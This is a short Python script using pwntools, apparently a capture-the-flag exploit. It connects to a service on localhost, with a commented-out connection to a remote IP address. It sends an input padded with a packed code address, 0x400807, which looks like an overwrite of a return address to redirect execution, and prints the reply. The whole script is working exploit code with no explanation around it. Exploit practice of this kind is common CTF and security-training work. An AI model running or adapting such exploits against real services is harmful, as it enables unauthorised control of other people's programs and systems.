from pwn import *

context.arch = "amd64"
#r = remote("13.48.67.196",50000)
r = remote("127.0.0.1", 1234)

addr = p64(0x0000000000400807)

r.sendline( b'10' + addr )
ans = r.recvall(2)
print(ans)

